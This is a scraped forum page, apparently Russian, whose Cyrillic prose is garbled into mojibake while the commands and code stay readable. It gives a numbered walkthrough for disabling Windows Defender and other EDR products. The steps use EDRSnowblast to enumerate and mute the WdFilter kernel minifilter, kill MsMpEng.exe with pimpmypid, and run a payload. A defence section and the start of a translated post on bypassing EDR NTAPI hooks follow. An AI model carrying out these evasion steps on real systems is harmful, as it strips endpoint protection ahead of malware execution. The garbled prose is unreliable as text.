1) –ø–µ—Ä–µ—á–∏—Å–ª–∏—Ç—å –¥—Ä–∞–π–≤–µ—Ä—ã (—Ñ–∏–ª—å—Ç—Ä—ã), –∫–æ—Ç–æ—Ä—ã–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã –≤ –ø–∞–º—è—Ç—å —è–¥—Ä–∞ –∏ –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å Windows Defender: WdFilter –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –Ω–∞ 9-–π –ø–æ–∑–∏—Ü–∏–∏ –Ω–∞ —Ä–∏—Å—É–Ω–∫–µ –Ω–∏–∂–µ<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>EDRSnowblast.exe filter-enum --kernelmode</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797311292.png"
		data-src="https://osint42.org/attachments/1746797311292-png.343/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797311292-png.343/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797311292.png"
			title="1746797311292.png"
			width="1024" height="387" loading="lazy" />
	</div><br />
<br />
2) –ø–æ–ª—É—á–∏—Ç—å –¥–µ—Ç–∞–ª–∏ –æ —Ñ–∏–ª—å—Ç—Ä–µ WdFilter: –Ω–∞–ø—Ä–∏–º–µ—Ä, MaxConnections &amp; NumberOfConnections<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>EDRSnowblast.exe filter-enum --kernelmode --filter-index 9</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797320957.png"
		data-src="https://osint42.org/attachments/1746797320957-png.344/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797320957-png.344/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797320957.png"
			title="1746797320957.png"
			width="1024" height="776" loading="lazy" />
	</div><br />
<br />
3) –∑–∞–≥–ª—É—à–∏—Ç—å WdFilter: —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å MaxConnections –≤ –Ω–æ–ª—å<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>EDRSnowblast.exe filter-mute --kernelmode --filter-index 9</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797331968.png"
		data-src="https://osint42.org/attachments/1746797331968-png.345/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797331968-png.345/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797331968.png"
			title="1746797331968.png"
			width="1024" height="353" loading="lazy" />
	</div><br />
<br />
4. (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ) –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ MaxConnections, –∏—Å–ø–æ–ª—å–∑—É—è –æ–ø—Ü–∏—é --filter-enum, –∫–∞–∫ –±—ã–ª–æ –ø–æ–∫–∞–∑–∞–Ω–æ —Ä–∞–Ω–µ–µ<br />
5. –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å PID –ø—Ä–æ—Ü–µ—Å—Å–∞ Windows Defender –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ –∏ —É–±–∏—Ç—å –µ–≥–æ<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>tasklist | findstr MsMpEng.exe MsMpEng.exe 2956 Services 0 206,788 K c:\pimpmypid_clt.exe /kill 2956</code></pre>
	</div>
</div>6. —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –Ω–∞—à—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, —Å–æ–∑–¥–∞–Ω–Ω—É—é –Ω–∞ —à–∞–≥–µ 3, –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>copy z:\iwanttobeflag.exe c:
c:\iwanttobeflag.exe</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797347621.png"
		data-src="https://osint42.org/attachments/1746797347621-png.346/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797347621-png.346/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797347621.png"
			title="1746797347621.png"
			width="528" height="284" loading="lazy" />
	</div><br />
<br />
8.–Ω–∞—Å–ª–∞–∂–¥–∞—Ç—å—Å—è –Ω–∞—à–∏–º —É—Å–ø–µ—Ö–æ–º<br />
<br />
–ï—Å–ª–∏ —Ö–æ—Ç–∏—Ç–µ, –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤–∏–¥–µ–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –Ω–∏–∂–µ.<br />
<br />
<div class="bbMediaWrapper" data-media-site-id="youtube" data-media-key="PakPq-83IEE">
	<div class="bbMediaWrapper-inner">
		<iframe src="https://www.youtube.com/embed/PakPq-83IEE?wmode=opaque"
				loading="lazy"
				width="560" height="315"
				frameborder="0" allowfullscreen="true"></iframe>
	</div>
</div><br />
–≠—Ç–∞ —Ç–µ—Ö–Ω–∏–∫–∞ –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∞ –ø—Ä–æ—Ç–∏–≤ Windows Defender –∏ –¥–≤—É—Ö –¥—Ä—É–≥–∏—Ö –ø–æ—Å—Ç–∞–≤—â–∏–∫–æ–≤ EDR.<br />
<br />
<b>–ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è / –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å?</b><br />
<br />
–ú—ã –¥–æ–ª–∂–Ω—ã –Ω–∞—á–∞—Ç—å —Å –≤–æ–ø—Ä–æ—Å–∞, –∫–∞–∫–∏–µ –ø—Ä–µ–¥–ø–æ—Å—ã–ª–∫–∏ –¥–ª—è &quot;–∑–∞–≥–ª—É—à–µ–Ω–∏—è —Ñ–∏–ª—å—Ç—Ä–∞&quot;?<br />
<ul>
<li data-xf-list-type="ul">–≤—ã –¥–æ–ª–∂–Ω—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–∏–º–∏—Ç–∏–≤ —ç–∫—Å–ø–ª–æ–π—Ç–∞ —á—Ç–µ–Ω–∏—è/–∑–∞–ø–∏—Å–∏ —è–¥—Ä–∞ Windows ‚Äì –µ—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å BYOVD (–ü—Ä–∏–Ω–µ—Å–∏ –°–≤–æ–π –£—è–∑–≤–∏–º—ã–π –î—Ä–∞–π–≤–µ—Ä), –≤—ã –¥–æ–ª–∂–Ω—ã –∏–º–µ—Ç—å SeLoadDriverPrivilege, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ / –≤—ã–≥—Ä—É–∑–∫–∏ –¥—Ä–∞–π–≤–µ—Ä–æ–≤ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –ª–æ–∫–∞–ª—å–Ω—ã–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä, –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –¥–æ–º–µ–Ω–∞, –æ–ø–µ—Ä–∞—Ç–æ—Ä –ø–µ—á–∞—Ç–∏ –¥–æ–º–µ–Ω–∞)</li>
<li data-xf-list-type="ul">–≤—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Å–ø–æ—Å–æ–±–Ω—ã —É–±–∏–≤–∞—Ç—å (–∏–ª–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—Ç—å) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ EDR</li>
</ul>–¢–µ–ø–µ—Ä—å –º—ã –º–æ–≥–ª–∏ –±—ã –∑–∞–¥–∞—Ç—å—Å—è –≤–æ–ø—Ä–æ—Å–æ–º, –≤–æ–∑–º–æ–∂–Ω–æ –ª–∏ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π Windows –∑–∞—â–∏—Ç–∏—Ç—å —Å–µ–±—è? –ò –¥–∞, —Å—É—â–µ—Å—Ç–≤—É—é—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –º–µ—Ä—ã –ø—Ä–µ–¥–æ—Å—Ç–æ—Ä–æ–∂–Ω–æ—Å—Ç–∏. –í–æ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:<br />
<ul>
<li data-xf-list-type="ul">–ø—Ä–∏–º–µ–Ω—è—Ç—å –ø–∞—Ç—á–∏ Windows: —ç—Ç–æ —É—Å—Ç—Ä–∞–Ω—è–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –∏–∑ —è–¥—Ä–∞ Windows –∏ –¥—Ä–∞–π–≤–µ—Ä–æ–≤</li>
<li data-xf-list-type="ul">–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Microsoft VBS (–≤–∫–ª—é—á–∏—Ç—å HVCI): –∫–∞–∫ –≤—ã –º–æ–≥–ª–∏ –∑–∞–º–µ—Ç–∏—Ç—å, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –≤–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏ - BYOVD. –≠—Ç–æ—Ç –≤–µ–∫—Ç–æ—Ä –∏–∑–≤–µ—Å—Ç–µ–Ω –¥–∞–≤–Ω–æ, –∏ Microsoft –ø—Ä–æ–¥–µ–ª–∞–ª–∞ –±–æ–ª—å—à—É—é —Ä–∞–±–æ—Ç—É, —á—Ç–æ–±—ã —Å–º—è–≥—á–∏—Ç—å —ç—Ç–æ —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏ (VBS), –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –≤ Windows 10, Windows 11, Windows Server 2016 –∏ –±–æ–ª–µ–µ –ø–æ–∑–¥–Ω–∏—Ö –≤–µ—Ä—Å–∏—è—Ö. –ë–æ–ª—å—à–µ –¥–µ—Ç–∞–ª–µ–π –æ VBS –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft: –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –Ω–∞ –æ—Å–Ω–æ–≤–µ –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏ (VBS)</li>
<li data-xf-list-type="ul">–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ä–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–Ω—ã–µ Microsoft –ø—Ä–∞–≤–∏–ª–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –¥—Ä–∞–π–≤–µ—Ä–æ–≤, <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules" target="_blank" class="link link--external" rel="noopener">–¥–æ—Å—Ç—É–ø–Ω—ã–µ –∑–¥–µ—Å—å</a></li>
<li data-xf-list-type="ul">–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Sysmon –∏–ª–∏ –ø—Ä–∞–≤–∏–ª–∞ Sigma: –æ–≥—Ä–æ–º–Ω—ã–π —Å–ø–∏—Å–æ–∫ –∏–∑–≤–µ—Å—Ç–Ω–æ —É—è–∑–≤–∏–º—ã—Ö –¥—Ä–∞–π–≤–µ—Ä–æ–≤ –¥–æ—Å—Ç—É–ø–µ–Ω –Ω–∞ <a href="http://www.loldrivers.io/" target="_blank" class="link link--external" rel="noopener">www.loldrivers.io</a>, –∏ —ç—Ç–æ—Ç –ø—Ä–æ–µ–∫—Ç –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Ç–∞–∫–æ–≥–æ —Ä–æ–¥–∞ –ø—Ä–∞–≤–∏–ª–∞</li>
</ul><b>–î—Ä—É–≥–æ–π –≤–æ–ø—Ä–æ—Å:</b> –º–æ–≥—É—Ç –ª–∏ –ø–æ—Å—Ç–∞–≤—â–∏–∫–∏ EDR –∑–∞—â–∏—Ç–∏—Ç—å —Å–≤–æ–∏ –¥—Ä–∞–π–≤–µ—Ä—ã –æ—Ç —ç—Ç–æ–π –∞—Ç–∞–∫–∏? –î–∞, –æ–Ω–∏ –º–æ–≥—É—Ç!<br />
<br />
–°–∞–º–æ–µ –±—ã—Å—Ç—Ä–æ–µ —Ä–µ—à–µ–Ω–∏–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫ –∏–∑–≤–µ—Å—Ç–Ω–æ —É—è–∑–≤–∏–º—ã—Ö –¥—Ä–∞–π–≤–µ—Ä–æ–≤, –∏–∑–±–µ–≥–∞—è –∏—Ö –∑–∞–≥—Ä—É–∑–∫–∏. –ù–æ —É —ç—Ç–æ–≥–æ –º–µ—Ç–æ–¥–∞ —Ç–µ –∂–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è, —á—Ç–æ –∏ —É —Å–∏–≥–Ω–∞—Ç—É—Ä AV; –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–µ —É—è–∑–≤–∏–º—ã–µ –¥—Ä–∞–π–≤–µ—Ä—ã –Ω–µ –±—É–¥—É—Ç –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å—Å—è.<br />
<br />
<b>–õ—É—á—à–∞—è –∑–∞—â–∏—Ç–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞–º–∏ (–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–Ω–Ω–∫–µ—Ç–∞ —Å EDR):</b><br />
<br />
- –í—Å–µ–≥–¥–∞ –ø—Ä–æ–≤–µ—Ä—è—Ç—å, —á—Ç–æ EDR_process.exe –º–æ–∂–µ—Ç –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ –ø–æ—Ä—Ç—É —Å–≤—è–∑–∏ EDR_driver.sys. –ü—Ä–∏–º–µ—Ä –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –¥–æ—Å—Ç–∏—á—å —ç—Ç–æ–≥–æ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hPort;
HRESULT hr = ::FilterConnectCommunicationPort(L&quot;\\secureEDR&quot;,0, nullptr, 0, nullptr, &amp;hPort);

if (FAILED(hr)) {
   printf(&quot;Error connecting to EDR_driver.sys ! (HR=0x%08X)\n&quot;, hr);
   if (hr == 0x800704D6) {
      printf(&quot;ERROR_CONNECTION_COUNT_LIMIT : A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.\n&quot;);
   }
}
// Other common errors you should check are
// ERROR_BAD_PATHNAME (HR=0x800700A1)
// E_FILE_NOT_FOUND (HR=0x80070002)
// E_ACCESSDENIED (HR=0x80070005)
// ERROR_INVALID_NAME (HR=0x8007007B)</code></pre>
	</div>
</div><br />
- –°—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π KDP: –¥—Ä–∞–π–≤–µ—Ä EDR –¥–æ–ª–∂–µ–Ω –≤—ã–∑–≤–∞—Ç—å API MmProtectDriverSection –¥–ª—è –∑–∞—â–∏—Ç—ã —Å–µ–∫—Ü–∏–∏ —Å–≤–æ–µ–≥–æ –æ–±—Ä–∞–∑–∞<br />
<br />
- –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π KDP: –ø–æ–∑–≤–æ–ª—è–µ—Ç –¥—Ä–∞–π–≤–µ—Ä—É –≤—ã–¥–µ–ª—è—Ç—å –∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –ø–∞–º—è—Ç—å —Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è, –∏—Å–ø–æ–ª—å–∑—É—è —É—Å–ª—É–≥–∏, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ–º—ã–µ –∑–∞—â–∏—â–µ–Ω–Ω—ã–º –ø—É–ª–æ–º, –∫–æ—Ç–æ—Ä—ã–π —É–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –∑–∞—â–∏—â–µ–Ω–Ω—ã–º —è–¥—Ä–æ–º, –∏—Å–ø–æ–ª—å–∑—É—è API ExAllocatePool3.<br />
–ë–æ–ª—å—à–µ –¥–µ—Ç–∞–ª–µ–π –æ KDP –≤ –ø–æ—Å—Ç–µ –ê–Ω–¥—Ä–µ–∞ –ê–ª–ª–∏–µ–≤–∏: <a href="https://www.microsoft.com/en-us/security/blog/2020/07/08/" target="_blank" class="link link--external" rel="noopener">–í–≤–µ–¥–µ–Ω–∏–µ –≤ –∑–∞—â–∏—Ç—É –¥–∞–Ω–Ω—ã—Ö —è–¥—Ä–∞</a>.</div>
						

							<h2>MutationGate - –ù–æ–≤—ã–π –ø–æ–¥—Ö–æ–¥ —Ä–∞–±–æ—Ç—ã —Å —Å–∏—Å–∫–æ–ª–∞–º–∏</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746797822236.png"
		data-src="https://osint42.org/attachments/1746797822236-png.347/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797822236-png.347/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797822236.png"
			title="1746797822236.png"
			width="512" height="512" loading="lazy" />
	</div><br />
<br />
–ü–µ—Ä–µ–≤–æ–¥:<a href="https://winslow1984.com/books/malware/page/mutationgate" target="_blank" class="link link--external" rel="noopener">MutationGate | Winslow Blog</a><br />
<br />
<h4 class="bbHeading"><a class="u-anchorTarget" name="-motivatsiya"></a>–ú–æ—Ç–∏–≤–∞—Ü–∏—è&#8203;<a class="hoverLink" href="#-motivatsiya" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h4>–£—á–∏—Ç—ã–≤–∞—è, —á—Ç–æ –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ —Ö—É–∫–∏ —è–≤–ª—è—é—Ç—Å—è –æ—Å–Ω–æ–≤–Ω—ã–º –º–µ—Ç–æ–¥–æ–º –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–º –ø—Ä–æ–¥—É–∫—Ç–∞–º–∏ EDR, –æ–±—Ö–æ–¥ –∏—Ö —è–≤–ª—è–µ—Ç—Å—è –¥–ª—è –º–µ–Ω—è –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–π —Ç–µ–º–æ–π.<br />
<br />
–ß—Ç–æ –∫–∞—Å–∞–µ—Ç—Å—è –æ–±—Ö–æ–¥–∞ –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã—Ö —Ö—É–∫–æ–≤, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö EDR, —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –¥–æ–≤–æ–ª—å–Ω–æ –º–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–æ–¥—Ö–æ–¥–æ–≤. –•–æ—Ç—è –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–∑ —Ä–∞–Ω–Ω–∏—Ö –ø–æ–¥—Ö–æ–¥–æ–≤ –æ—á–µ–Ω—å –ª–µ–≥–∫–æ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—é—Ç—Å—è, —Å—É—â–µ—Å—Ç–≤—É—é—Ç –∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ –∑—Ä–µ–ª—ã—Ö –ø–æ–¥—Ö–æ–¥–æ–≤.<br />
–¢–µ–º –Ω–µ –º–µ–Ω–µ–µ, <b><u>—è —Å—á–∏—Ç–∞—é, —á—Ç–æ –±—ã–ª–æ –±—ã –æ—á–µ–Ω—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ –Ω–∞–π—Ç–∏ –Ω–æ–≤—ã–π –ø–æ–¥—Ö–æ–¥ –∫ –æ–±—Ö–æ–¥—É —Ö—É–∫–æ–≤</u></b>, –Ω–∞–¥–µ—é—Å—å, —ç—Ç–æ –ø—Ä–∏–Ω–µ—Å–µ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —É–ª—É—á—à–µ–Ω–∏—è –∏–ª–∏ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞.<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-vstroyennyi-khuk"></a>–í—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π —Ö—É–∫&#8203;<a class="hoverLink" href="#-vstroyennyi-khuk" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>–ü—Ä–æ–¥—É–∫—Ç—ã EDR (Endpoint Detection and Response) —á–∞—Å—Ç–æ —Ä–∞–∑–º–µ—â–∞—é—Ç –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ —Ö—É–∫–∏ –Ω–∞ NTAPI, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º –ü–û, —Ç–∞–∫–∏—Ö –∫–∞–∫ NtAllocateVirtualMemory, NtUnmapViewOfSection, NtWriteVirtualMemory –∏ –¥—Ä—É–≥–∏—Ö. –≠—Ç–æ —Å–≤—è–∑–∞–Ω–æ —Å —Ç–µ–º, —á—Ç–æ NTAPI —è–≤–ª—è–µ—Ç—Å—è –º–æ—Å—Ç–æ–º –º–µ–∂–¥—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ–º –∏ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ–º —è–¥—Ä–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797831662.png"
		data-src="https://osint42.org/attachments/1746797831662-png.348/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797831662-png.348/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797831662.png"
			title="1746797831662.png"
			width="501" height="556" loading="lazy" />
	</div><br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, NtAllocateVirtualMemory —è–≤–ª—è–µ—Ç—Å—è –≤–µ—Ä—Å–∏–µ–π NTAPI —Ñ—É–Ω–∫—Ü–∏–∏ VirtualAlloc. –†–∞–∑–º–µ—â–∞—è –±–µ–∑—É—Å–ª–æ–≤–Ω—É—é –∫–æ–º–∞–Ω–¥—É –ø–µ—Ä–µ—Ö–æ–¥–∞ –≤ NTAPI, –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ –æ—Ç —Ç–æ–≥–æ, –≤—ã–∑—ã–≤–∞–µ—Ç –ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞ Win32 API –∏–ª–∏ NTAPI, EDR —Å–ø–æ—Å–æ–±–µ–Ω –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤—ã–∑–æ–≤ –∏ –¥–∞–ª–µ–µ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –µ–≥–æ –Ω–∞–º–µ—Ä–µ–Ω–∏–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797837846.png"
		data-src="https://osint42.org/attachments/1746797837846-png.349/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797837846-png.349/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797837846.png"
			title="1746797837846.png"
			width="1101" height="615" loading="lazy" />
	</div><br />
<br />
–°–ª–µ–¥—É—é—â–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç—ã –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç, –∫–∞–∫ –≤—ã–≥–ª—è–¥–∏—Ç —Ö—É–∫–∏ –Ω–∞ NTAPI:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797844255.png"
		data-src="https://osint42.org/attachments/1746797844255-png.350/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797844255-png.350/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797844255.png"
			title="1746797844255.png"
			width="840" height="725" loading="lazy" />
	</div><br />
<br />
–ê –µ—Å–ª–∏ –Ω–∞ NTAPI –Ω–µ—Ç —Ö—É–∫–∞, –º—ã –º–æ–∂–µ–º –∑–∞–º–µ—Ç–∏—Ç—å –æ—á–µ–Ω—å –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π —à–∞–±–ª–æ–Ω, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, –∫–∞–∫ –≤—ã–≥–ª—è–¥–∏—Ç –∑–∞–≥–ª—É—à–∫–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797851399.png"
		data-src="https://osint42.org/attachments/1746797851399-png.351/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797851399-png.351/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797851399.png"
			title="1746797851399.png"
			width="1148" height="206" loading="lazy" />
	</div><br />
<br />
